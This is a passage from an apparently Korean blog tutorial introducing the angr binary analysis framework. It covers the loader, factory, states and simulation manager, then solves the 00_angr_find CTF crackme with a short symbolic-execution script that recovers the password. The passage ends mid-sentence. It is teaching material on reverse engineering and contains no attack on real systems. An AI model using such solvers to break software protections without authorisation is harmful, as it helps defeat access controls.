class="hljs-string">&apos;analyses&apos;</span>: &lt;angr.analyses.analysis.AnalysesHub object at <span class="hljs-number">0x00000225ED698A00</span>&gt;, <span class="hljs-string">&apos;kb&apos;</span>: &lt;angr.knowledge_base.knowledge_base.KnowledgeBase object at <span class="hljs-number">0x00000225ED698C70</span>&gt;, <span class="hljs-string">&apos;simos&apos;</span>: &lt;angr.simos.linux.SimLinux object at <span class="hljs-number">0x00000225ED698A90</span>&gt;, <span class="hljs-string">&apos;is_java_project&apos;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&apos;is_java_jni_project&apos;</span>: <span class="hljs-literal">False</span>}</code></pre><p>&#xC544;&#x2026; &#xBAA8;&#xB974;&#xB294;&#xAC8C; &#xB9CE;&#xB124;&#xC694;&#x2026; &#xD558;&#xD558;&#x2026; &#xC800;&#xAC78; &#xB2E4; &#xACF5;&#xBD80;&#xD574;&#xC57C; &#xD55C;&#xB2E4;&#xACE0;??</p><p><img src="/2021/07/10/j0ker/angr_part1/1625553299.gif" alt="3" title="&#xC57C;&#xB808;&#xC57C;&#xB808;..."></p><blockquote><p>&#xC57C;&#xB808;&#xC57C;&#xB808;&#x2026;</p></blockquote><p>&#xD558;&#xB098;&#xC529; &#xC54C;&#xC544;&#xAC00;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xC8E0;&#x2026; &#xD750;&#xD750;&#x2026;</p><h2 id="loader"><a href="#loader" class="headerlink" title="loader"></a>loader</h2><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader&lt;Loaded <span class="hljs-number">00</span>_angr_find, maps [<span class="hljs-number">0x8048000</span>:<span class="hljs-number">0x8407fff</span>]&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.shared_objects{<span class="hljs-string">&apos;00_angr_find&apos;</span>: &lt;ELF Object <span class="hljs-number">00</span>_angr_find, maps [<span class="hljs-number">0x8048000</span>:<span class="hljs-number">0x804a03f</span>]&gt;, <span class="hljs-string">&apos;extern-address space&apos;</span>: &lt;ExternObject Object cle<span class="hljs-comment">##externs, maps [0x8200000:0x8207fff]&gt;, </span><span class="hljs-string">&apos;cle##tls&apos;</span>: &lt;ELFTLSObjectV2 Object cle<span class="hljs-comment">##tls, maps [0x8300000:0x8314807]&gt;}</span><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.min_addr<span class="hljs-number">0x8048000</span><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.max_addr<span class="hljs-number">0x8407fff</span><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.main_object&lt;ELF Object <span class="hljs-number">00</span>_angr_find, maps [<span class="hljs-number">0x8048000</span>:<span class="hljs-number">0x804a03f</span>]&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.main_object.execstack<span class="hljs-literal">False</span><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.main_object.pic<span class="hljs-literal">False</span></code></pre><p>loader&#xC5D0;&#xC11C;&#xB294; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xAC00; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC5B4;&#xB5BB;&#xAC8C; &#xB9E4;&#xD551;&#xB418;&#xB294;&#xC9C0;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. angr&#xC5D0;&#xC11C;&#xB294; CLE&#xB77C;&#xB294; &#xBAA8;&#xB4C8;&#xC744; &#xD1B5;&#xD574; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xC5D0; &#xB9E4;&#xD551;&#xD55C; &#xB2E4;&#xC74C;, loader&#xC5D0; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C; &#xC815;&#xBCF4;&#xB4E4;&#xC744; &#xC800;&#xC7A5;&#xD55C;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xC9C0;&#xAE08;&#xC740; &#xADF8;&#xC800; &#x201C;loader&#xB97C; &#xD1B5;&#xD574; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xAC00; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB9E4;&#xD551;&#xB41C; &#xC8FC;&#xC18C;&#xB098; &#xBBF8;&#xD2F0;&#xAC8C;&#xC774;&#xC158; &#xC801;&#xC6A9; &#xC5EC;&#xBD80;&#xB97C; &#xC54C; &#xC218; &#xC788;&#xB2E4;&#x201D; &#xC815;&#xB3C4;&#xB9CC; &#xC54C;&#xBA74; &#xB420;&#xB4EF; &#xD569;&#xB2C8;&#xB2E4;!</p><h2 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h2><p>angr&#xC5D0;&#xC11C;&#xB294; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC774; &#xC5B4;<del>~</del>~~~&#x3141;&#xCCAD; &#xB9CE;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xCF54;&#xB4DC;&#xB4E4;&#xC774; &#xB09C;&#xC7A1;&#xD574;&#xC9C0;&#xB294; &#xAC83;&#xC744; &#xB9C9;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xC790;&#xC8FC; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xB4E4;&#xC744; factory&#xB77C;&#xB294; &#xD074;&#xB798;&#xC2A4;&#xC5D0; &#xB123;&#xC5B4;&#xB1A8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="block"><a href="#block" class="headerlink" title="block"></a>block</h3><p>&#xC55E;&#xC5D0;&#xC11C;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xAC00; &#xB9E4;&#xD551;&#xB418;&#xC5C8;&#xB294;&#xC9C0;&#xB97C; &#xC54C;&#xC558;&#xC73C;&#xB2C8; &#xC774;&#xC81C; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xC5D0; &#xC788;&#xB294; &#xB0B4;&#xC6A9;&#xC744; &#xC54C;&#xC544;&#xBCFC;&#xAC81;&#xB2C8;&#xB2E4;. black &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB294; &#xD2B9;&#xC815; &#xC8FC;&#xC18C;&#xC758; &#xBA85;&#xB839;&#xC5B4; &#xBE14;&#xB7ED;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>block = proj.factory.block(proj.entry)<span class="hljs-meta">&gt;&gt;&gt; </span>block.pp()<span class="hljs-number">0x8048450</span>:      xor     ebp, ebp<span class="hljs-number">0x8048452</span>:      pop     esi<span class="hljs-number">0x8048453</span>:      mov     ecx, esp<span class="hljs-number">0x8048455</span>:      <span class="hljs-keyword">and</span>     esp, <span class="hljs-number">0xfffffff0</span><span class="hljs-number">0x8048458</span>:      push    eax<span class="hljs-number">0x8048459</span>:      push    esp<span class="hljs-number">0x804845a</span>:      push    edx<span class="hljs-number">0x804845b</span>:      push    <span class="hljs-number">0x8048710</span><span class="hljs-number">0x8048460</span>:      push    <span class="hljs-number">0x80486b0</span><span class="hljs-number">0x8048465</span>:      push    ecx<span class="hljs-number">0x8048466</span>:      push    esi<span class="hljs-number">0x8048467</span>:      push    <span class="hljs-number">0x80485c7</span><span class="hljs-number">0x804846c</span>:      call    <span class="hljs-number">0x8048420</span><span class="hljs-meta">&gt;&gt;&gt; </span>block.instructions<span class="hljs-number">0xd</span><span class="hljs-meta">&gt;&gt;&gt; </span>block.instruction_addrs[<span class="hljs-number">0x8048450</span>, <span class="hljs-number">0x8048452</span>, <span class="hljs-number">0x8048453</span>, <span class="hljs-number">0x8048455</span>, <span class="hljs-number">0x8048458</span>, <span class="hljs-number">0x8048459</span>, <span class="hljs-number">0x804845a</span>, <span class="hljs-number">0x804845b</span>, <span class="hljs-number">0x8048460</span>, <span class="hljs-number">0x8048465</span>, <span class="hljs-number">0x8048466</span>, <span class="hljs-number">0x8048467</span>, <span class="hljs-number">0x804846c</span>]</code></pre><p>&#xC774;&#xCC98;&#xB7FC; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xBCF4;&#xACE0; &#xC2F6;&#xC740; &#xC8FC;&#xC18C;&#xB97C; &#xC778;&#xC790;&#xB97C; &#xC8FC;&#xBA74; &#xC6D0;&#xD558;&#xB294; &#xCF54;&#xB4DC; &#xBE14;&#xB7ED;&#xC5D0; &#xC788;&#xB294; &#xBA85;&#xB839;&#xC5B4;&#xB4E4;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBA85;&#xB839;&#xC5B4;&#xC758; &#xB370;&#xC774;&#xD130; &#xD615;&#xC2DD;&#xC744; &#xBCFC; &#xC218;&#xB3C4; &#xC788;&#xACE0; &#xBA85;&#xB839;&#xC5B4; &#xAC01;&#xAC01;&#xC758; &#xC8FC;&#xC18C;&#xB3C4; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="state"><a href="#state" class="headerlink" title="state"></a>state</h3><p>Project &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xCD08;&#xAE30;&#xC0C1;&#xD0DC;&#xC758; &#xC815;&#xC801;&#xC778; &#xC815;&#xBCF4;&#xB97C; &#xB2F4;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB0E5; &#xC815;&#xC801;&#xC778; &#xB370;&#xC774;&#xD130;&#xB9CC; &#xAC00;&#xC9C0;&#xACE0;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC2E4;&#xD589;&#xD558;&#xBA74;&#xC11C; &#xAC12;&#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xBCC0;&#xD558;&#xB294;&#xC9C0;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218;&#xB294; &#xC5C6;&#xACA0;&#xC8E0;? &#xADF8;&#xB798;&#xC11C; angr&#xC5D0;&#xC11C;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xAC83;&#xCC98;&#xB7FC; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC744; &#xD560; &#xC218; &#xC788;&#xACE0; &#xC774; &#xACFC;&#xC815;&#xC744; SimState&#xB77C;&#xB294; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xD1B5;&#xD574; &#xD655;&#xC778;&#xD558;&#xAC70;&#xB098; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>state = proj.factory.entry_state()<span class="hljs-meta">&gt;&gt;&gt; </span>state.regs.eip&lt;BV32 <span class="hljs-number">0x8048450</span>&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>state.regs.eax&lt;BV32 <span class="hljs-number">0x1c</span>&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>state.mem[proj.entry].int.resolved&lt;BV32 <span class="hljs-number">0x895eed31</span>&gt;</code></pre><p>&#xC9C0;&#xAE08;&#xC740; &#xC5D4;&#xD2B8;&#xB9AC; &#xD3EC;&#xC778;&#xD2B8;&#xC5D0;&#xC11C;&#xC758; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC640; &#xBA54;&#xBAA8;&#xB9AC; &#xC0C1;&#xD0DC;&#xB97C; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADFC;&#xB370; &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xAC12;&#xC744; &#xD655;&#xC778;&#xD558;&#xBA74; &#xADF8;&#xB0E5; &#xC778;&#xD2F0;&#xC800; &#xAC12;&#xC774; &#xC544;&#xB2CC;&#xAC70; &#xAC19;&#xB124;&#xC694;?</p><p>angr&#xC5D0;&#xC11C;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xB098; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC758; &#xAC12;&#xC744; bitvector &#xD615;&#xC2DD;&#xC73C;&#xB85C; &#xC800;&#xC7A5;&#xD55C;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; 32&#xBE44;&#xD2B8;&#xB098; 64&#xBE44;&#xD2B8; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB294; &#xCD5C;&#xB300;&#xAC12;&#xC774; &#xB118;&#xC5B4;&#xAC00;&#xBA74; 0&#xC73C;&#xB85C; &#xB418;&#xBA74;&#xC11C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC796;&#xC544;&#xC694;? &#xADFC;&#xB370; &#xC544;&#xC2DC;&#xACA0;&#xC9C0;&#xB9CC; &#xD30C;&#xC774;&#xC36C;&#xC758; &#xC778;&#xD2F0;&#xC800;&#xB294; &#xADF8;&#xB7F0;&#xAC8C; &#xC5C6;&#xC8E0;! &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0; &#xB530;&#xC704;&#xB294; &#xC6EC;&#xB9CC;&#xD558;&#xBA74; &#xC77C;&#xC5B4;&#xB098;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; 32&#xBE44;&#xD2B8;&#xC640; 64&#xBE44;&#xD2B8; bitvector&#xB97C; &#xD65C;&#xC6A9;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bv = state.solver.BVV(<span class="hljs-number">0x1234</span>, <span class="hljs-number">32</span>)&lt;BV32 <span class="hljs-number">0x1234</span>&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>state.solver.eval(bv)<span class="hljs-number">0x1234</span><span class="hljs-meta">&gt;&gt;&gt; </span>state.regs.rsi = state.solver.BVV(<span class="hljs-number">3</span>, <span class="hljs-number">64</span>)<span class="hljs-meta">&gt;&gt;&gt; </span>state.regs.rsi&lt;BV64 <span class="hljs-number">0x3</span>&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>state.mem[<span class="hljs-number">0x1000</span>].long = <span class="hljs-number">4</span><span class="hljs-meta">&gt;&gt;&gt; </span>state.mem[<span class="hljs-number">0x1000</span>].long.resolved&lt;BV64 <span class="hljs-number">0x4</span>&gt;</code></pre><p>&#xC774;&#xB7F0;&#xC2DD;&#xC73C;&#xB85C; bitvector&#x2194; integer&#xB97C; &#xC654;&#xB2E4;&#xAC14;&#xB2E4; &#xD0C0;&#xC785;&#xBCC0;&#xD658;&#xC744; &#xD560; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xD0C0;&#xC785;&#xC744; &#xC9C0;&#xC815;&#xD574;&#xC11C; &#xAC12;&#xC744; &#xC800;&#xC7A5;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xC8E0;.</p><h3 id="Simulation-manager"><a href="#Simulation-manager" class="headerlink" title="Simulation_manager"></a>Simulation_manager</h3><p>state&#xB97C; &#xD1B5;&#xD574; &#xC5B4;&#xB514;&#xC11C; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC744; &#xD560;&#xC9C0;&#xB97C; &#xC9C0;&#xC815;&#xD588;&#xB2E4;&#xBA74; Simulation_manager&#xB97C; &#xD1B5;&#xD574;&#xC11C;&#xB294; &#xC9C0;&#xC815;&#xD55C; state&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xD558;&#xBA74;&#xC11C; &#xC5B4;&#xB5BB;&#xAC8C; &#xB370;&#xC774;&#xD130;&#xB4E4;&#xC774; &#xBC14;&#xB00C;&#xC5B4; &#xB098;&#xAC00;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>simgr = proj.factory.simulation_manager(state)<span class="hljs-meta">&gt;&gt;&gt; </span>simgr.active[&lt;SimState @ <span class="hljs-number">0x8048450</span>&gt;]<span class="hljs-meta">&gt;&gt;&gt; </span>simgr.step()&lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">1</span> active&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>simgr.active[<span class="hljs-number">0</span>].regs.eip&lt;BV32 <span class="hljs-number">0x8048420</span>&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>simgr.step()&lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">1</span> active&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>simgr.active[<span class="hljs-number">0</span>].regs.eip&lt;BV32 <span class="hljs-number">0x8100014</span>&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>state.regs.eip&lt;BV32 <span class="hljs-number">0x8048450</span>&gt;</code></pre><p>&#xC774;&#xB807;&#xAC8C; Simulation Manager&#xC5D0;&#xC11C; step() &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; eip&#xAC00; &#xBC14;&#xB00C;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD638;&#xD638; factory&#xB294; &#xC624;&#xB298;&#xC740; &#xC774;&#xC815;&#xB3C4;&#xB9CC; &#xC54C;&#xC544;&#xBCFC;&#xD150;&#xB370;&#x2026; &#xB098;&#xC911;&#xC5D0; &#xB9CE;&#xC774; &#xB9CC;&#xB0A0;&#xAC70; &#xAC19;&#xC740; &#xBD88;&#xC548;&#xD55C; &#xB290;&#xB08C;&#x2026; &#xD558;&#xD558;&#x2026;(&#xC2A4;&#xD3EC;)</p><h2 id="Analyses"><a href="#Analyses" class="headerlink" title="Analyses"></a>Analyses</h2><p>angr&#xC5D0;&#xC11C;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xD558;&#xB098;&#xBD80;&#xD130; &#xC5F4;&#xAE4C;&#xC9C0; &#xB2E4; &#xBD84;&#xC11D;&#xD558;&#xACE0; &#xC0BD;&#xC9C8;&#xD558;&#xBA70; &#xC2DC;&#xAC04; &#xB0AD;&#xBE44;&#xB97C; &#xD558;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xC218;&#xB9CE;&#xC740; &#xBD84;&#xC11D; &#xD234;&#xB4E4;&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xD234;&#xB4E4;&#xC774; &#xB0B4;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xD074;&#xB798;&#xC2A4;&#xAC00; &#xBC14;&#xB85C; Analyses &#xC785;&#xB2C8;&#xB2E4;! &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC815;&#xB9D0; &#xB9CE;&#xC740; &#xAE30;&#xB2A5;&#xC774; &#xC788;&#xB294;&#xB370;, &#xAC01;&#xAC01;&#xC758; &#xAE30;&#xB2A5;&#xC740; &#xCD94;&#xD6C4;&#xC5D0; &#xC9C1;&#xC811; &#xC368;&#xBCF4;&#xBA74;&#xC11C; &#xC18C;&#xAC1C;&#xD574;&#xB4DC;&#xB9AC;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xB3C4; &#xB2E4; &#xC18C;&#xAC1C;&#xD558;&#xB294; &#xBB34;&#xB9AC;&#xB370;&#xC2A4;&#x2026;</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>proj.analyses.proj.analyses.AILBlockSimplifier(              proj.analyses.Decompiler(                      proj.analyses.StructuredCodeGenerator(proj.analyses.AILCallSiteMaker(                proj.analyses.Disassembly(                     proj.analyses.Structurer(proj.analyses.AILSimplifier(                   proj.analyses.DivSimplifier(                   proj.analyses.Typehoon(proj.analyses.BackwardSlice(                   proj.analyses.DominanceFrontier(               proj.analyses.VFG(proj.analyses.BasePointerSaveSimplifier(       proj.analyses.EagerReturnsSimplifier(          proj.analyses.VSA_DDG(proj.analyses.BinDiff(                         proj.analyses.Identifier(                      proj.analyses.VariableRecovery(proj.analyses.BinaryOptimizer(                 proj.analyses.ImportSourceCode(                proj.analyses.VariableRecoveryFast(proj.analyses.BoyScout(                        proj.analyses.InitFinder(                      proj.analyses.Veritesting(proj.analyses.CDG(                             proj.analyses.InitializationFinder(            proj.analyses.XRefs(proj.analyses.CFB(                             proj.analyses.LoopFinder(                      proj.analyses.discard_plugin_preset(proj.analyses.CFBlanket(                       proj.analyses.ModSimplifier(                   proj.analyses.get_plugin(proj.analyses.CFG(                             proj.analyses.MultiSimplifier(                 proj.analyses.has_plugin(proj.analyses.CFGEmulated(                     proj.analyses.Propagator(                      proj.analyses.has_plugin_presetproj.analyses.CFGFast(                         proj.analyses.Proximity(                       proj.analyses.plugin_presetproj.analyses.CFGFastSoot(                     proj.analyses.ReachingDefinitions(             proj.analyses.projectproj.analyses.CalleeCleanupFinder(             proj.analyses.Reassembler(                     proj.analyses.register_default(proj.analyses.CallingConvention(               proj.analyses.RecursiveStructurer(             proj.analyses.register_plugin(proj.analyses.Clinic(                          proj.analyses.RegionIdentifier(                proj.analyses.register_preset(proj.analyses.CodeTagging(                     proj.analyses.RegionSimplifier(                proj.analyses.release_plugin(proj.analyses.CompleteCallingConventions(      proj.analyses.SootClassHierarchy(              proj.analyses.reload_analyses(proj.analyses.CongruencyCheck(                 proj.analyses.StackCanarySimplifier(           proj.analyses.use_plugin_preset(proj.analyses.ConstantDereferencesSimplifier(  proj.analyses.StackPointerTracker(proj.analyses.DDG(                             proj.analyses.StaticHooker(</code></pre><h1 id="00-angr-find"><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h1><p>&#xADF8;&#xB0E5; &#xC124;&#xBA85;&#xB9CC; &#xD558;&#xB2E4; &#xB05D;&#xB0B4;&#xAE30;&#xB294; &#xC544;&#xC26C;&#xC6B0;&#xB2C8;&#xAE4C; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xD29C;&#xD1A0;&#xB9AC;&#xC5BC; &#xBB38;&#xC81C; &#xD558;&#xB098;&#xB9CC; &#xBCF4;&#xACE0; &#xB9C8;&#xBB34;&#xB9AC;&#xD560;&#xAC8C;&#xC694;. &#xC774; <a href="https://github.com/jakespringer/angr_ctf">&#xB9C1;&#xD06C;</a>&#xB85C; &#xB4E4;&#xC5B4;&#xAC00;&#xC154;&#xC11C; &#xB808;&#xD3EC;&#xB97C; &#xD074;&#xB860;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xC774; &#xB808;&#xD3EC;&#xB294; angr&#xC758; &#xAE30;&#xB2A5;&#xC744; ctf &#xBB38;&#xC81C; &#xC2A4;&#xD0C0;&#xC77C;&#xB85C; &#xD558;&#xB098;&#xD558;&#xB098; &#xACF5;&#xBD80;&#xD558;&#xAE30;&#xC5D0; &#xC801;&#xD569;&#xD574; &#xBCF4;&#xC5EC;&#xC11C; &#xAC00;&#xC838;&#xC640; &#xBD24;&#xC5B4;&#xC694;. 00_angr_find&#xB294; &#xADF8; &#xCCAB;&#xBC88;&#xC9F8; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;!</p><pre><code class="hljs python">${<span class="hljs-keyword">import</span> random, osrandom.seed(os.urandom(<span class="hljs-number">8</span>))userdef_charset = <span class="hljs-string">&apos;ABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;</span>userdef = <span class="hljs-string">&apos;&apos;</span>.join(random.choice(userdef_charset) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>))}$<span class="hljs-comment">#include &lt;stdio.h&gt;</span><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><span class="hljs-comment">#include &lt;string.h&gt;</span><span class="hljs-comment">#define USERDEF &quot;${ userdef }$&quot;</span><span class="hljs-comment">#define LEN_USERDEF ${ write(len(userdef)) }$</span>char msg[] =  <span class="hljs-string">&quot;${ description }$&quot;</span>;void print_msg() {  printf(<span class="hljs-string">&quot;%s&quot;</span>, msg);}int complex_function(int value, int i) {<span class="hljs-comment">#define LAMBDA 3</span>  <span class="hljs-keyword">if</span> (!(<span class="hljs-string">&apos;A&apos;</span> &lt;= value &amp;&amp; value &lt;= <span class="hljs-string">&apos;Z&apos;</span>)) {    printf(<span class="hljs-string">&quot;Try again.\\n&quot;</span>);    exit(<span class="hljs-number">1</span>);  }  <span class="hljs-keyword">return</span> ((value - <span class="hljs-string">&apos;A&apos;</span> + (LAMBDA * i)) % (<span class="hljs-string">&apos;Z&apos;</span> - <span class="hljs-string">&apos;A&apos;</span> + <span class="hljs-number">1</span>)) + <span class="hljs-string">&apos;A&apos;</span>;}int main(int argc, char* argv[]) {  char buffer[<span class="hljs-number">9</span>];  //print_msg();  printf(<span class="hljs-string">&quot;Enter the password: &quot;</span>);  scanf(<span class="hljs-string">&quot;%8s&quot;</span>, buffer);  <span class="hljs-keyword">for</span> (int i=<span class="hljs-number">0</span>; i&lt;LEN_USERDEF; ++i) {    buffer[i] = complex_function(buffer[i], i);  }  <span class="hljs-keyword">if</span> (strcmp(buffer, USERDEF)) {    printf(<span class="hljs-string">&quot;Try again.\\n&quot;</span>);  } <span class="hljs-keyword">else</span> {    printf(<span class="hljs-string">&quot;Good Job.\\n&quot;</span>);  }}</code></pre><p>&#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xBA74; &#xC720;&#xC800;&#xAC00; &#xC778;&#xD48B;&#xC744; &#xB123;&#xC73C;&#xBA74; &#xC778;&#xD48B;&#xC744; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; &#xC5B4;&#xB5A4; &#xC5F0;&#xC0B0; &#xC791;&#xC5C5;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xADF8; &#xACB0;&#xACFC; &#xAC12;&#xC744; &#xCEF4;&#xD30C;&#xC77C; &#xB2F9;&#xC2DC; &#xB79C;&#xB364;&#xD558;&#xAC8C; &#xC0DD;&#xC131;&#xB41C; &#xBB38;&#xC790;&#xC5F4;&#xACFC; &#xBE44;&#xAD50;&#xD558;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xBA74; &#xC6B0;&#xB9AC;&#xAC00; &#xD574;&#xC57C;&#xD558;&#xB294; &#xAC83;&#xC740; &#xC5F0;&#xC0B0; &#xACB0;&#xACFC;&#xAC00; &#xD574;&#xB2F9; &#xBB38;&#xC790;&#xC5F4;&#xACFC; &#xC77C;&#xCE58;&#xD558;&#xB294; &#xC778;&#xD48B;&#xC744; &#xCC3E;&#xC544;&#xC57C;&#xACA0;&#xAD70;&#xC694;! &#xC989;, main &#xD568;&#xC218;&#xC5D0;&#xC11C; printf(&#x201C;Good Job.\n&#x201D;); &#xC774; &#xC2E4;&#xD589;&#xB420; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD574;&#xC57C;&#xD55C;&#xB2E4;&#xB294; &#xAC70;&#xC8E0;. &#xC27D;&#xC8E0;? &#xC774;&#xC815;&#xB3C4;&#xB294; angr&#xD55C;&#xD14C;&#xB294; &#xAECC;&#xC774;&#xACA0;&#xC8E0;? &#xC774;&#xC81C; &#xC704; &#xCF54;&#xB4DC;&#xB97C; &#xCEF4;&#xD30C;&#xC77C;&#xD558;&#xACE0; &#xC544;&#xB798; &#xCF54;&#xB4DC;&#xB97C; &#xB3CC;&#xB824;&#xBD05;&#xC2DC;&#xB2E4;!</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>    proj = angr.Project(<span class="hljs-string">&apos;00_angr_find&apos;</span>)    init_state = proj.factory.entry_state()    simulation = proj.factory.simgr(init_state)    print_good = <span class="hljs-number">0x804867d</span>    simulation.explore(find=print_good)    <span class="hljs-keyword">if</span> simulation.found:        solution = simulation.found[<span class="hljs-number">0</span>]        print(<span class="hljs-string">&apos;flag: &apos;</span>, solution.posix.dumps(<span class="hljs-number">0</span>))    <span class="hljs-keyword">else</span>:        print(<span class="hljs-string">&apos;no solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:    main()</code></pre><p>&#xCEF4;&#xD30C;&#xC77C;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; IDA&#xB85C; &#xD655;&#xC778;&#xD574;&#xC11C; printf(&#x201C;Good Job.\n&#x201D;);&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC54C;&#xC544;&#xB0C5;&#xB2C8;&#xB2E4;.(&#xC8FC;&#xC18C;&#xB294; &#xBC14;&#xB014; &#xC218; &#xC788;&#xC73C;&#xB2C8; &#xAC01;&#xC790; 